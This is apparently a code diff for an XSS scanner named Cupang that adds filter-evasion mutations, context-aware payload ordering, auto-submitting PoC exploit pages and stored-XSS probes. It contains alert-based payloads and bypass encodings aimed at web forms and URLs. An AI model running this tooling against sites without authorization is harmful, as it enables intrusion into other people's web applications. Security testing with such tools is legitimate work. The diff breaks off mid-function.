@@ -1,14 +1,4 @@
 #!/usr/bin/env python3
-"""
-Cupang v2.8 - Lightweight XSS Scanner
-Auto-detect: Reflected XSS, Stored XSS, DOM-based XSS
-Features: 
-  - Lightweight fast scanning by default
-  - Use -a/--all flag for maximum testing with all payloads
-  - Custom headers support (-H flag)
-  - Modular architecture for better performance
-"""
-
 import requests
 import re
 import time
@@ -25,13 +15,160 @@ from colorama import init, Fore, Style
 
 
 init(autoreset=True)
+class InsaneMutation:
+    @staticmethod
+    def nested_bypass(text):
+        if '<script' in text.lower():
+            return text.replace('<script', '<scr<script>ipt')
+        if 'onerror' in text.lower():
+            return text.replace('onerror', 'onerronerroror')
+        return text
+
+    @staticmethod
+    def unicode_bypass(text):
+        return text.replace('i', 'ı').replace('s', 'ſ').replace('I', 'İ')
+
+    @staticmethod
+    def json_breakout(text):
+        return ['\\";alert(1)//', '\"-alert(1)-"', "'}alert(1);{'"]
+
+    @classmethod
+    def mutate(cls, payload):
+        mutations = [payload]
+        mutations.append(cls.nested_bypass(payload))
+        mutations.append(cls.unicode_bypass(payload))
+        return list(set(mutations))
+
+
+class BypassGenerator:
+    @staticmethod
+    def case_scramble(text):
+        if not text.startswith('<'):
+            return text
+        
+        result = ""
+        in_tag = False
+        for i, char in enumerate(text):
+            if char == '<':
+                in_tag = True
+                result += char
+            elif char == '>':
+                in_tag = False
+                result += char
+            elif in_tag and char.isalpha():
+                if i % 2 == 0:
+                    result += char.upper()
+                else:
+                    result += char.lower()
+            else:
+                result += char
+        return result
+
+    @staticmethod
+    def double_url_encode(text):
+        return quote(quote(text))
+
+    @staticmethod
+    def html_entity_encode(text):
+        entities = {
+            '<': '&#60;',
+            '>': '&#62;',
+            '"': '&#34;',
+            "'": '&#39;',
+            '(': '&#40;',
+            ')': '&#41;'
+        }
+        result = ""
+        for char in text:
+            result += entities.get(char, char)
+        return result
+
+    @staticmethod
+    def js_from_char_code(text):
+        if 'alert(' not in text:
+            return text
+        
+        match = re.search(r"alert\(['\"](.*?)['\"]\)", text)
+        if not match:
+            return text
+        
+        content = match.group(1)
+        codes = [str(ord(c)) for c in content]
+        return text.replace(f"alert('{content}')", f"alert(String.fromCharCode({','.join(codes)}))").replace(f'alert("{content}")', f"alert(String.fromCharCode({','.join(codes)}))")
+
+    @classmethod
+    def mutate(cls, payload):
+        mutations = [payload]
+        mutations.append(cls.case_scramble(payload))
+        mutations.append(cls.html_entity_encode(payload))
+        
+
+        mutations.extend(InsaneMutation.mutate(payload))
+        
+        return list(set(mutations))
+
+
+class RedTeamBypass:
+    @staticmethod
+    def get_context_payloads(context, payloads):
+        preferred = []
+        others = []
+        
+        for p in payloads:
+            is_preferred = False
+            if context == 'html' and p.startswith('<'):
+                is_preferred = True
+            elif context == 'attribute' and (p.startswith('"') or p.startswith("'") or p.startswith('x"')):
+                is_preferred = True
+            elif context == 'script' and (';' in p or '\\"' in p or '</script>' in p.lower()):
+                is_preferred = True
+            
+            if is_preferred:
+                preferred.append(p)
+            else:
+                others.append(p)
+        
+
+        return preferred + others
+
+    @staticmethod
+    def generate_poc_html(url, param, payload, method):
+        if method == 'GET':
+            return f"""
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>XSS PoC Exploit</h1>
+    <p>Target: {url}</p>
+    <p>Parameter: {param}</p>
+    <script>
+        window.location = "{url}";
+    </script>
+</body>
+</html>
+"""
+        else:
+            return f"""
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>XSS PoC Exploit (POST)</h1>
+    <form id="xss" action="{url}" method="POST">
+        <input type="hidden" name="{param}" value='{payload}'>
+    </form>
+    <script>document.getElementById("xss").submit();</script>
+</body>
+</html>
+"""
+
 class UniversalXSSScanner:
-    def __init__(self, target_url, threads=10, timeout=10, test_all=False, custom_headers=None, verbose=False):
+    def __init__(self, target_url, threads=10, timeout=10, test_all=False, custom_headers=None, verbose=False, do_crawl=False):
         self.target_url = target_url
         self.threads = threads
         self.timeout = timeout
         self.test_all = test_all
         self.verbose = verbose
+        self.do_crawl = do_crawl
         
         self.session = requests.Session()
         self.session.headers.update({
@@ -50,37 +187,133 @@ class UniversalXSSScanner:
         
         self.unique_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
         
+        self.common_params = ['q', 's', 'search', 'id', 'name', 'query', 'debug', 'msg', 'url', 'redirect', 'page', 'type', 'config', 'category']
         self.test_payloads = self.load_payloads()
     
+    def _identify_reflection_context(self, url, param_name, method='GET', form_data=None):
+        canary = f"cupang{self.unique_id}"
+        try:
+            if method == 'GET':
+                parsed = urlparse(url)
+                params = parse_qs(parsed.query)
+                params[param_name] = [canary]
+                new_query = urlencode(params, doseq=True)
+                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, 
+                                     parsed.params, new_query, parsed.fragment))
+                response = self.session.get(test_url, timeout=self.timeout)
+            else:
+                data = form_data.copy() if form_data else {}
+                data[param_name] = canary
+                response = self.session.post(url, data=data, timeout=self.timeout)
+            
+            html = response.text
+            if canary not in html:
+                return 'none', []
+
+            soup = BeautifulSoup(html, 'html.parser')
+            
+            scripts = soup.find_all('script')
+            for script in scripts:
+                if script.string and canary in script.string:
+                    return 'script', ['" ', "' ", "; ", "</script>"]
+
+            for tag in soup.find_all():
+                for attr, value in tag.attrs.items():
+                    if isinstance(value, list):
+                        value = " ".join(value)
+                    if canary in value:
+                        return 'attribute', ['" ', "' ", "> "]
+
+            if canary in html:
+                return 'html', ["<", ">", '"', "'"]
+                
+            return 'unknown', []
+        except:
+            return 'none', []
+
     def load_payloads(self):
-        """Load payloads - lightweight by default, comprehensive with -a flag"""
-        payloads = {'reflected': [], 'dom': []}
+        payloads = {'reflected': [], 'dom': [], 'stored': []}
         
         script_dir = os.path.dirname(os.path.abspath(__file__))
         payloads_dir = os.path.join(script_dir, 'payloads')
         
-        all_payloads_file = os.path.join(payloads_dir, 'all_payloads.txt')
-        if os.path.exists(all_payloads_file):
-            with open(all_payloads_file, 'r', encoding='utf-8') as f:
-                lines = [line.strip() for line in f if line.strip() and not line.startswith('#')]
-                
-                if self.test_all:
-                    selected_lines = lines
-                else:
-                    selected_lines = lines[:50] if len(lines) > 50 else lines
-                
-                for line in selected_lines:
-                    payload = line.replace('{ID}', self.unique_id)
-                    payloads['reflected'].append(payload)
-                    payloads['dom'].append(payload)
+        reflected_sources = [
+            os.path.join(payloads_dir, 'reflected.txt'),
+            os.path.join(payloads_dir, 'javascript_protocol.txt'),
+            os.path.join(payloads_dir, 'all_payloads.txt')
+        ]
+        dom_sources = [os.path.join(payloads_dir, 'dom.txt')]
         
-        if payloads['reflected']:
+        for path in reflected_sources:
+            payloads['reflected'].extend(self._read_payload_file(path))
+        for path in dom_sources:
+            payloads['dom'].extend(self._read_payload_file(path))
+        
+        json_payloads = self._load_payloads_from_json(os.path.join(payloads_dir, 'xss_payloads.json'))
+        if json_payloads:
+            payloads['reflected'].extend(json_payloads.get('reflected', []))
+            payloads['dom'].extend(json_payloads.get('dom', []))
+            payloads['stored'].extend(json_payloads.get('stored', []))
+        
+        payloads['reflected'] = self._select_payloads(
+            self._apply_unique_id(self._dedupe_payloads(payloads['reflected'])),
+            limit=50
+        )
+        payloads['dom'] = self._select_payloads(
+            self._apply_unique_id(self._dedupe_payloads(payloads['dom'])),
+            limit=50
+        )
+        payloads['stored'] = self._select_payloads(
+            self._apply_unique_id(self._dedupe_payloads(payloads['stored'])),
+            limit=20
+        )
+        
+        if payloads['reflected'] or payloads['dom'] or payloads['stored']:
             return payloads
         
         return self._get_fallback_payloads()
+
+    def _read_payload_file(self, path):
+        if not os.path.exists(path):
+            return []
+        
+        try:
+            with open(path, 'r', encoding='utf-8') as f:
+                return [line.strip() for line in f if line.strip() and not line.startswith('#')]
+        except OSError:
+            return []
+    
+    def _load_payloads_from_json(self, path):
+        if not os.path.exists(path):
+            return {}
+        
+        try:
+            with open(path, 'r', encoding='utf-8') as f:
+                data = json.load(f)
+                return data if isinstance(data, dict) else {}
+        except (OSError, json.JSONDecodeError):
+            return {}
+    
+    def _dedupe_payloads(self, payloads):
+        seen = set()
+        deduped = []
+        for payload in payloads:
+            if payload not in seen:
+                deduped.append(payload)
+                seen.add(payload)
+        return deduped
+    
+    def _apply_unique_id(self, payloads):
+        return [payload.replace('{ID}', self.unique_id) for payload in payloads]
+    
+    def _select_payloads(self, payloads, limit):
+        if not payloads:
+            return []
+        if self.test_all:
+            return payloads
+        return payloads[:limit] if len(payloads) > limit else payloads
     
     def _get_fallback_payloads(self):
-        """Fallback hardcoded payloads if external files not found"""
         return {
             'reflected': [
                 f'xss{self.unique_id}',
@@ -239,19 +472,29 @@ class UniversalXSSScanner:
                 f'#<script>alert(\'{self.unique_id}\')</script>',
                 f'?x=<svg/onload=alert(\'{self.unique_id}\')>',
                 f'?x=<script>alert(\'{self.unique_id}\')</script>',
+            ],
+            'stored': [
+                f'<img src=x onerror=alert("stored_{self.unique_id}")>'
             ]
         }
     
     def print_banner(self):
-        print(f"{Fore.CYAN}")
-        print("╔═══════════════════════════════════════════════════════════╗")
-        print("║                 UNIVERSAL XSS SCANNER v2.8                ║")
-        print("║     Reflected | Stored | DOM-based | File Upload XSS      ║")
-        print("╚═══════════════════════════════════════════════════════════╝")
+        print(f"{Fore.RED}{Style.BRIGHT}")
+        print(f"{Fore.RED}{Style.BRIGHT}    ██████╗██╗   ██╗██████╗  █████╗ ███╗   ██╗ ██████╗ ")
+        print(f"{Fore.RED}{Style.BRIGHT}   ██╔════╝██║   ██║██╔══██╗██╔══██╗████╗  ██║██╔════╝ ")
+        print(f"{Fore.RED}{Style.BRIGHT}   ██║     ██║   ██║██████╔╝███████║██╔██╗ ██║██║  ███╗")
+        print(f"{Fore.RED}{Style.BRIGHT}   ██║     ██║   ██║██╔═══╝ ██╔══██║██║╚██╗██║██║   ██║")
+        print(f"{Fore.RED}{Style.BRIGHT}   ╚██████╗╚██████╔╝██║     ██║  ██║██║ ╚████║╚██████╔╝")
+        print(f"{Fore.RED}{Style.BRIGHT}    ╚═════╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ")
+        print(f"{Fore.WHITE}Client-side Unsanitized Payload Auto-Nesting Generator v3.0")
+        print(f"{Fore.WHITE}               XSS Scanner & Bypass Suite")
+        print("")
+        print(f"{Fore.WHITE}https://github.com/andknownmaly/cupang")
         print(f"{Style.RESET_ALL}\n")
+        print(f"{Fore.GREEN}======================================================================")
+        print("")
     
     def get_forms(self, url, html_content):
-        """Extract semua form dari halaman"""
         soup = BeautifulSoup(html_content, 'html.parser')
         forms = []
         
@@ -259,6 +502,7 @@ class UniversalXSSScanner:
             form_details = {
                 'action': form.get('action', ''),
                 'method': form.get('method', 'get').lower(),
+                'enctype': (form.get('enctype') or 'application/x-www-form-urlencoded').lower(),
                 'inputs': []
             }
             
@@ -268,9 +512,21 @@ class UniversalXSSScanner:
                 form_details['action'] = url
             
             for input_tag in form.find_all(['input', 'textarea', 'select']):
-                input_type = input_tag.get('type', 'text')
+                input_type = input_tag.get('type', 'text') if input_tag.name == 'input' else input_tag.name
                 input_name = input_tag.get('name')
-                input_value = input_tag.get('value', '')
+                
+                if input_tag.name == 'textarea':
+                    input_value = input_tag.text or ''
+                elif input_tag.name == 'select':
+                    selected = input_tag.find('option', selected=True)
+                    if not selected:
+                        selected = input_tag.find('option')
+                    if selected:
+                        input_value = selected.get('value', selected.text or '')
+                    else:
+                        input_value = ''
+                else:
+                    input_value = input_tag.get('value', '')
                 
                 if input_name and input_type not in ['submit', 'button', 'reset']:
                     form_details['inputs'].append({
@@ -296,97 +552,139 @@ class UniversalXSSScanner:
             forms.append(form_details)
         
         return forms
+
+    def _build_form_payload(self, form, target_param, payload):
+        form_data = {}
+        files = {}
+        
+        for inp in form['inputs']:
+            name = inp['name']
+            input_type = inp['type']
+            if input_type == 'file':
+                continue
+            
+            if name == target_param:
+                value = payload
+            else:
+                if inp['value']:
+                    value = inp['value']
+                elif input_type in ['checkbox', 'radio']:
+                    value = 'on'
+                else:
+                    value = 'test'
+            
+            form_data[name] = value
+        
+        return form_data, files
     
     def get_url_parameters(self, url):
-        """Extract parameter dari URL"""
         parsed = urlparse(url)
         params = parse_qs(parsed.query)
         return {k: v[0] if v else '' for k, v in params.items()}
     
     def test_reflected_xss_url(self, url, param_name, param_value):
-        """Test reflected XSS pada URL parameter"""
         results = []
+
+        context, suggest_chars = self._identify_reflection_context(url, param_name)
+        if self.verbose:
+            print(f"    [Context] {param_name}: {context}")
+
+        candidate_payloads = RedTeamBypass.get_context_payloads(context, self.test_payloads['reflected'])
         
-        for payload in self.test_payloads['reflected']:
+        for payload in candidate_payloads:
             try:
-                parsed = urlparse(url)
-                params = parse_qs(parsed.query)
-                params[param_name] = [payload]
+
+                mutated_payloads = BypassGenerator.mutate(payload)
                 
-                new_query = urlencode(params, doseq=True)
-                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, 
-                                     parsed.params, new_query, parsed.fragment))
-                
-                response = self.session.get(test_url, timeout=self.timeout)
-                
-                vuln_info = self.detect_xss_in_response(response.text, payload, self.unique_id)
-                
-                if vuln_info['vulnerable']:
-                    results.append({
-                        'url': test_url,
-                        'param': param_name,
-                        'payload': payload,
-                        'method': 'GET',
-                        'type': 'reflected',
-                        'context': vuln_info['context'],
-                        'evidence': vuln_info['evidence']
-                    })
-                    break
+                for m_payload in mutated_payloads:
+                    parsed = urlparse(url)
+                    params = parse_qs(parsed.query)
+                    params[param_name] = [m_payload]
                     
-            except Exception as e:
+                    new_query = urlencode(params, doseq=True)
+                    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, 
+                                         parsed.params, new_query, parsed.fragment))
+                    
+                    response = self.session.get(test_url, timeout=self.timeout)
+                    vuln_info = self.detect_xss_in_response(response.text, m_payload, self.unique_id)
+                    
+                    if vuln_info['vulnerable']:
+                        results.append({
+                            'url': test_url,
+                            'param': param_name,
+                            'payload': m_payload,
+                            'method': 'GET',
+                            'type': 'reflected',
+                            'context': f"{context.upper()} | {vuln_info['context']}",
+                            'evidence': vuln_info['evidence']
+                        })
+                        return results # Found, move to next param
+                    
+            except Exception:
                 continue
         
         return results
     
     def test_reflected_xss_form(self, form):
-        """Test reflected XSS pada form"""
         results = []
-        found_params = {}
         
         for input_field in form['inputs']:
             param_name = input_field['name']
-            found_params[param_name] = []
             
-            for payload in self.test_payloads['reflected']:
+            context, suggest_chars = self._identify_reflection_context(
+                form['action'], param_name, method=form['method'], form_data={i['name']: i['value'] for i in form['inputs']}
+            )
+            
+            if self.verbose:
+                print(f"    [Context] Form {param_name}: {context}")
+
+            candidate_payloads = RedTeamBypass.get_context_payloads(context, self.test_payloads['reflected'])
+            
+            for payload in candidate_payloads:
                 try:
-                    form_data = {}
-                    for inp in form['inputs']:
-                        form_data[inp['name']] = payload
+                    mutated_payloads = BypassGenerator.mutate(payload)
                     
-                    if form['method'] == 'post':
-                        response = self.session.post(form['action'], data=form_data, 
-                                                    timeout=self.timeout, allow_redirects=True)
-                    else:
-                        response = self.session.get(form['action'], params=form_data, 
-                                                   timeout=self.timeout, allow_redirects=True)
-                    
-                    vuln_info = self.detect_xss_in_response(response.text, payload, self.unique_id)
-                    
-                    if vuln_info['vulnerable']:
-                        found_params[param_name].append({
-                            'url': form['action'],
-                            'param': param_name,
-                            'payload': payload,
-                            'method': form['method'].upper(),
-                            'type': 'reflected',
-                            'context': vuln_info['context'],
-                            'evidence': vuln_info['evidence'],
-                            'payloads': [payload]
-                        })
+                    for m_payload in mutated_payloads:
+                        form_data, files = self._build_form_payload(form, param_name, m_payload)
                         
-                except Exception as e:
+                        if form['method'] == 'post':
+                            response = self.session.post(
+                                form['action'],
+                                data=form_data,
+                                files=files if files else None,
+                                timeout=self.timeout,
+                                allow_redirects=True
+                            )
+                        else:
+                            response = self.session.get(form['action'], params=form_data, 
+                                                       timeout=self.timeout, allow_redirects=True)
+                        
+                        vuln_info = self.detect_xss_in_response(response.text, m_payload, self.unique_id)
+                        
+                        if vuln_info['vulnerable']:
+                            results.append({
+                                'url': form['action'],
+                                'param': param_name,
+                                'payload': m_payload,
+                                'method': form['method'].upper(),
+                                'type': 'reflected',
+                                'context': f"{context.upper()} | {vuln_info['context']}",
+                                'evidence': vuln_info['evidence'],
+                                'payloads': [m_payload]
+                            })
+
+                            break
+                    else:
+                        continue
+                    break 
+                        
+                except Exception:
                     continue
-        
-        for param, vulns in found_params.items():
-            if vulns:
-                best = vulns[0]
-                best['payloads'] = [v['payload'] for v in vulns]
-                results.append(best)
         
         return results
     
     def detect_xss_in_response(self, html, payload, unique_id):
-        """Improved XSS detection - deteksi comprehensive untuk semua context"""
+
         html_lower = html.lower()
         payload_lower = payload.lower()
         
@@ -396,38 +694,43 @@ class UniversalXSSScanner:
             'evidence': ''
         }
         
+
+        use_unique_id = unique_id.lower() in payload_lower
+        match_marker = unique_id if use_unique_id else payload
+        match_marker_lower = match_marker.lower()
+        
         if 'javascript:' in payload_lower:
-            href_pattern = re.findall(r'href\s*=\s*["\']?javascript:[^"\'>]*', html, re.IGNORECASE)
-            action_pattern = re.findall(r'action\s*=\s*["\']?javascript:[^"\'>]*', html, re.IGNORECASE)
-            formaction_pattern = re.findall(r'formaction\s*=\s*["\']?javascript:[^"\'>]*', html, re.IGNORECASE)
-            src_pattern = re.findall(r'src\s*=\s*["\']?javascript:[^"\'>]*', html, re.IGNORECASE)
-            data_pattern = re.findall(r'data\s*=\s*["\']?javascript:[^"\'>]*', html, re.IGNORECASE)
-            
-            matched = href_pattern or action_pattern or formaction_pattern or src_pattern or data_pattern
-            if matched:
-                evidence = matched[0]
-                if unique_id in evidence or any(x in evidence.lower() for x in ['alert', 'print', 'console.log', 'document.domain']):
-                    result['vulnerable'] = True
-                    result['context'] = 'JavaScript Protocol Injection'
-                    result['evidence'] = evidence[:200]
-                    result['payload'] = payload
-                    return result
-        
-        if unique_id.lower() not in html_lower:
-            return result
-        
-        import urllib.parse
-        
-        critical_encoded = ['%3C', '%3E', '%22', '%27', '%20', '%3c', '%3e']  # <, >, ", ', space
-        
-        for line in html.split('\n'):
-            if unique_id.lower() in line.lower():
-                for enc_char in critical_encoded:
-                    if enc_char in line:
+            patterns = [
+                r'href\s*=\s*["\']?javascript:[^"\'>]*',
+                r'action\s*=\s*["\']?javascript:[^"\'>]*',
+                r'formaction\s*=\s*["\']?javascript:[^"\'>]*',
+                r'src\s*=\s*["\']?javascript:[^"\'>]*',
+                r'data\s*=\s*["\']?javascript:[^"\'>]*'
+            ]
+            for p in patterns:
+                matched = re.findall(p, html, re.IGNORECASE)
+                if matched:
+                    evidence = matched[0]
+                    if (unique_id in evidence or 
+                        any(x in evidence.lower() for x in ['alert', 'print', 'console.log', 'document.domain']) or
+                        (not use_unique_id and payload_lower in evidence.lower())):
+                        result['vulnerable'] = True
+                        result['context'] = 'JavaScript Protocol Injection'
+                        result['evidence'] = evidence[:200]
+                        result['payload'] = payload
                         return result
         
+        if not use_unique_id:
+            if len(payload) < 4:
+                return result
+            if payload_lower not in html_lower:
+                return result
+        elif unique_id.lower() not in html_lower:
+            return result
+        
+        # 1. Script Tag Injection
         if '<script' in html_lower and '<script' in payload_lower:
-            script_pattern = re.findall(r'<script[^>]*>.*?' + re.escape(unique_id) + r'.*?</script>', 
+            script_pattern = re.findall(r'<script[^>]*>.*?' + re.escape(match_marker) + r'.*?</script>', 
                                        html, re.IGNORECASE | re.DOTALL)
             if script_pattern:
                 result['vulnerable'] = True
@@ -436,27 +739,28 @@ class UniversalXSSScanner:
                 return result
             
             for line in html.split('\n'):
-                if '<script' in line.lower() and unique_id.lower() in line.lower():
+                if '<script' in line.lower() and match_marker_lower in line.lower():
                     if '<script>' in line.lower() or '<script ' in line.lower():
                         result['vulnerable'] = True
                         result['context'] = 'Script Tag Injection'
                         result['evidence'] = line.strip()[:200]
                         return result
-        
+
         dangerous_tags = ['img', 'svg', 'video', 'audio', 'body', 'iframe', 'object', 'embed', 
                          'details', 'marquee', 'template']
         for tag in dangerous_tags:
             if f'<{tag}' in html_lower and f'<{tag}' in payload_lower:
-                tag_regex = re.findall(f'<{tag}[^>]*' + re.escape(unique_id) + r'[^>]*>', 
+                tag_regex = re.findall(f'<{tag}[^>]*' + re.escape(match_marker) + r'[^>]*>', 
                                       html, re.IGNORECASE)
                 if tag_regex:
+
                     encoded_check = f'&lt;{tag}' in html_lower or f'&#{ord("<")};{tag}' in html_lower
                     if not encoded_check:
                         result['vulnerable'] = True
                         result['context'] = f'{tag.upper()} Tag Injection'
                         result['evidence'] = tag_regex[0][:200]
                         return result
-        
+
         dangerous_events = [
             'onerror=', 'onload=', 'onfocus=', 'onmouseover=', 'onclick=', 
             'onmouseenter=', 'onmouseleave=', 'onmousedown=', 'onmouseup=',
@@ -466,156 +770,98 @@ class UniversalXSSScanner:
         
         for event in dangerous_events:
             if event in html_lower and event in payload_lower:
-                if (f'{event}alert' in html_lower or f'{event}javascript' in html_lower or 
-                    f'{event}prompt' in html_lower or f'{event}confirm' in html_lower or
-                    f'{event}print' in html_lower or f'{event}console' in html_lower or
-                    f'{event}document' in html_lower or f'{event}throw' in html_lower or
-                    f'{event}eval' in html_lower):
+                if (any(x in html_lower for x in [f'{event}alert', f'{event}javascript', f'{event}prompt', 
+                                                 f'{event}confirm', f'{event}print', f'{event}console', 
+                                                 f'{event}document', f'{event}throw', f'{event}eval'])):
                     for line in html.split('\n'):
-                        if event in line.lower() and unique_id.lower() in line.lower():
+                        if event in line.lower() and match_marker_lower in line.lower():
                             line_check = line.strip()
-                            
-                            is_encoded = ('&lt;' in line_check or '&gt;' in line_check or 
-                                        '&#' in line_check[:line_check.find(event.lower()) + 50] if event.lower() in line_check else False)
-                            
+                            is_encoded = ('&lt;' in line_check or '&gt;' in line_check)
                             if not is_encoded:
                                 result['vulnerable'] = True
                                 result['context'] = f'Event Handler: {event.rstrip("=")}'
                                 result['evidence'] = line.strip()[:200]
                                 return result
-        
-        if 'autofocus' in html_lower and 'autofocus' in payload_lower:
-            for line in html.split('\n'):
-                if 'autofocus' in line.lower() and unique_id.lower() in line.lower():
-                    if any(ev in line.lower() for ev in dangerous_events):
-                        line_check = line.strip()
-                        is_encoded = ('&lt;' in line_check or '&gt;' in line_check or 
-                                    '&quot;' in line_check or '&#' in line_check)
-                        
-                        if not is_encoded:
-                            result['vulnerable'] = True
-                            result['context'] = 'Autofocus with Event Handler'
-                            result['evidence'] = line.strip()[:200]
-                            return result
-        
+
         for line in html.split('\n'):
-            if unique_id.lower() in line.lower():
-                
+            if match_marker_lower in line.lower():
                 has_dangerous_event = any(ev in line.lower() for ev in dangerous_events)
-                
                 if has_dangerous_event:
                     for ev in dangerous_events:
                         if ev in line.lower():
                             ev_pos = line.lower().find(ev)
-                            snippet_start = max(0, ev_pos - 50)
-                            snippet_end = min(len(line), ev_pos + 100)
-                            snippet = line[snippet_start:snippet_end]
-                            
-                            if ('"' + ev in snippet.lower() or "'" + ev in snippet.lower()) and \
-                               unique_id.lower() in snippet.lower():
+                            snippet = line[max(0, ev_pos - 50):min(len(line), ev_pos + 100)]
+                            if (('"' + ev in snippet.lower() or "'" + ev in snippet.lower()) and 
+                                match_marker_lower in snippet.lower()):
                                 result['vulnerable'] = True
-                                result['context'] = 'Attribute Break with Event Handler (IMG SRC)'
+                                result['context'] = 'Attribute Break with Event Handler'
                                 result['evidence'] = line.strip()[:200]
                                 return result
-        
+
         script_contents = re.findall(r'<script[^>]*>(.*?)</script>', html, re.IGNORECASE | re.DOTALL)
         for script_content in script_contents:
-            if unique_id in script_content:
+            if match_marker in script_content:
                 if any(pattern in script_content.lower() for pattern in ['alert(', 'prompt(', 'confirm(', 'eval(', 'document.', 'window.']):
                     result['vulnerable'] = True
                     result['context'] = 'JavaScript Context Injection'
                     result['evidence'] = script_content[:200]
                     return result
-        
-        if 'javascript:' in html_lower and 'javascript:' in payload_lower:
-            js_protocol = re.findall(r'(?:href|src|data|action)=["\']?(javascript:[^"\'>\s]*' + re.escape(unique_id) + r'[^"\'>\s]*)', 
-                                    html, re.IGNORECASE)
-            if js_protocol:
-                result['vulnerable'] = True
-                result['context'] = 'JavaScript Protocol Injection'
-                result['evidence'] = js_protocol[0][:200]
-                return result
-        
-        if 'data:' in html_lower and 'data:' in payload_lower:
-            data_uri = re.findall(r'(?:href|src)=["\']?(data:[^"\'>\s]*' + re.escape(unique_id) + r'[^"\'>\s]*)', 
-                                 html, re.IGNORECASE)
-            if data_uri:
-                result['vulnerable'] = True
-                result['context'] = 'Data URI Injection'
-                result['evidence'] = data_uri[0][:200]
-                return result
-        
-        special_tags = [('meta', 'Meta'), ('link', 'Link'), ('style', 'Style')]
-        for tag, name in special_tags:
-            if f'<{tag}' in html_lower and f'<{tag}' in payload_lower:
-                tag_pattern = re.findall(f'<{tag}[^>]*' + re.escape(unique_id) + r'[^>]*>', 
-                                        html, re.IGNORECASE)
-                if tag_pattern:
-                    result['vulnerable'] = True
-                    result['context'] = f'{name} Tag Injection'
-                    result['evidence'] = tag_pattern[0][:200]
-                    return result
-        
-        form_elements = ['input', 'textarea', 'select', 'button', 'form', 'keygen']
-        for elem in form_elements:
-            if f'<{elem}' in html_lower and f'<{elem}' in payload_lower:
-                elem_pattern = re.findall(f'<{elem}[^>]*' + re.escape(unique_id) + r'[^>]*>', 
-                                         html, re.IGNORECASE)
-                if elem_pattern:
-                    if any(ev in elem_pattern[0].lower() for ev in dangerous_events):
-                        result['vulnerable'] = True
-                        result['context'] = f'{elem.upper()} Element with Event Handler'
-                        result['evidence'] = elem_pattern[0][:200]
-                        return result
-        
+
         if payload in html or payload.replace(' ', '') in html.replace(' ', ''):
             dangerous_patterns = ['<script', '<img', '<svg', '<iframe', '<object', '<embed',
                                 'onerror=', 'onload=', 'javascript:', 'data:text/html']
             for pattern in dangerous_patterns:
                 if pattern in payload_lower:
                     for line in html.split('\n'):
-                        if unique_id.lower() in line.lower() and pattern in line.lower():
+                        if match_marker_lower in line.lower() and pattern in line.lower():
                             result['vulnerable'] = True
                             result['context'] = 'Direct HTML/JavaScript Injection'
                             result['evidence'] = line.strip()[:200]
                             return result
         
         return result
+        
+        return result
     
     def test_stored_xss(self, form):
-        """Test stored XSS - submit payload dan cek apakah muncul di halaman lain"""
         results = []
-        
-        stored_payload = f'<img src=x onerror=alert("stored_{self.unique_id}")>'
+        stored_payloads = self.test_payloads.get('stored') or [
+            f'<img src=x onerror=alert("stored_{self.unique_id}")>'
+        ]
         
         for input_field in form['inputs']:
             try:
-                form_data = {}
                 param_name = input_field['name']
                 
-                for inp in form['inputs']:
-                    form_data[inp['name']] = stored_payload
-                
-                if form['method'] == 'post':
-                    response = self.session.post(form['action'], data=form_data, 
-                                               timeout=self.timeout, allow_redirects=True)
-                else:
-                    response = self.session.get(form['action'], params=form_data, 
-                                              timeout=self.timeout, allow_redirects=True)
-                
-                if f'stored_{self.unique_id}' in response.text:
-                    vuln_info = self.detect_xss_in_response(response.text, stored_payload, 
-                                                           f'stored_{self.unique_id}')
-                    if vuln_info['vulnerable']:
-                        results.append({
-                            'url': form['action'],
-                            'param': param_name,
-                            'payload': stored_payload,
-                            'method': form['method'].upper(),
-                            'type': 'stored',
-                            'context': vuln_info['context'],
-                            'evidence': vuln_info['evidence']
-                        })
+                for stored_payload in stored_payloads:
+                    form_data, files = self._build_form_payload(form, param_name, stored_payload)
+                    
+                    if form['method'] == 'post':
+                        response = self.session.post(
+                            form['action'],
+                            data=form_data,
+                            files=files if files else None,
+                            timeout=self.timeout,
+                            allow_redirects=True
+                        )
+                    else:
+                        response = self.session.get(form['action'], params=form_data, 
+                                                  timeout=self.timeout, allow_redirects=True)
+                    
+                    if stored_payload in response.text or self.unique_id in response.text:
+                        vuln_info = self.detect_xss_in_response(response.text, stored_payload, 
+                                                               self.unique_id)
+                        if vuln_info['vulnerable']:
+                            results.append({
+                                'url': form['action'],
+                                'param': param_name,
+                                'payload': stored_payload,
+                                'method': form['method'].upper(),
+                                'type': 'stored',
+                                'context': vuln_info['context'],
+                                'evidence': vuln_info['evidence']
+                            })
+                            break
                         
             except Exception as e:
                 continue
@@ -623,7 +869,6 @@ class UniversalXSSScanner:
         return results
     
     def test_dom_based_xss(self, url):
-        """Test DOM-based XSS dengan analisis JavaScript"""
         results = []
         
         try:
@@ -677,7 +922,6 @@ class UniversalXSSScanner:
         return results
     
     def test_header_xss(self, url, header_name='User-Agent'):
-        """Test XSS in HTTP headers (e.g., User-Agent, Referer)"""
         results = []
         
         header_payloads = [
@@ -726,7 +970,6 @@ class UniversalXSSScanner:
         return results
     
     def test_file_upload_xss(self, form):
-        """Test XSS via file upload"""
         results = []
         
         file_inputs = []
@@ -871,16 +1114,38 @@ class UniversalXSSScanner:
                     response = self.session.get(form['action'], files=files, timeout=self.timeout)
                 
                 soup = BeautifulSoup(response.text, 'html.parser')
-                images = soup.find_all('img')
                 uploaded_files = []
                 
-                for img in images:
+                # Search in img tags
+                for img in soup.find_all('img'):
                     src = img.get('src', '')
-                    if src and ('uploads/' in src or '.svg' in src or '.jpg' in src or '.gif' in src):
-                        file_url = src if src.startswith('http') else urljoin(form['action'], src)
-                        uploaded_files.append(file_url)
+                    if src:
+                        uploaded_files.append(src)
                 
-                for file_url in uploaded_files:
+                # Search in anchor tags
+                for a in soup.find_all('a'):
+                    href = a.get('href', '')
+                    if href:
+                        uploaded_files.append(href)
+                
+                # Search for strings that look like the filename we just uploaded
+                for vector in vectors:
+                    filename = vector['filename']
+                    if filename in response.text:
+                        # Try to extract URL around the filename
+                        pattern = r'["\']([^"\']*/' + re.escape(filename) + r'[^"\']*)["\']'
+                        matches = re.findall(pattern, response.text)
+                        for m in matches:
